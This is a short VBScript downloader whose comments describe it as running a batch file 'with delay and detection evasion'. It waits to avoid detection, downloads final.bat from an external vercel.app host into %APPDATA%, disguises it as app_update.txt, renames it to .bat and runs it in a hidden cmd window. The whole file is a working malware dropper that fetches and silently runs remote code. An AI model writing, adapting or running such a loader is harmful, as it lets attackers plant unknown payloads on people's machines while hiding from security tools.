' Script to download, modify, and run a batch file with delay and detection evasion
' Deletes old files, waits 10 seconds, creates a folder, downloads a file, replaces text, and runs it

' Declare variables
Dim shell, fso, folderPath, parentFolder, xmlHttp, stream, content, batFile

' Initialize objects
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Wait for 10 seconds to avoid immediate detection
WScript.Sleep 10000

' Set folder path
folderPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\CustomApp\Temp"

' Delete existing folder and its contents if it exists
If fso.FolderExists(folderPath) Then
    fso.DeleteFolder folderPath, True
End If

' Create the folder anew
parentFolder = Left(folderPath, InStrRev(folderPath, "\") - 1)
If Not fso.FolderExists(parentFolder) Then
    fso.CreateFolder parentFolder
End If
fso.CreateFolder folderPath

' Download the file
Set xmlHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
xmlHttp.Open "GET", "https://service-omega-snowy.vercel.app/final.bat", False
xmlHttp.Send

' Process the downloaded content
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' Binary
stream.Open
stream.Write xmlHttp.responseBody
stream.Position = 0
stream.Type = 2 ' Text
stream.Charset = "utf-8"
content = stream.ReadText

' Modify the content by replacing "****" with the specified URL
content = Replace(content, "****", "")

' Save to a file with a less suspicious name
batFile = folderPath & "\app_update.txt"
stream.Position = 0
stream.SetEOS
stream.WriteText content
stream.SaveToFile batFile, 2 ' Overwrite mode

' Rename the file to .bat just before execution
If fso.FileExists(folderPath & "\app_update.bat") Then
    fso.DeleteFile folderPath & "\app_update.bat"
End If
fso.MoveFile batFile, folderPath & "\app_update.bat"

' Run the batch file with minimal visibility
shell.Run "cmd.exe /c " & Chr(34) & folderPath & "\app_update.bat" & Chr(34), 0, False
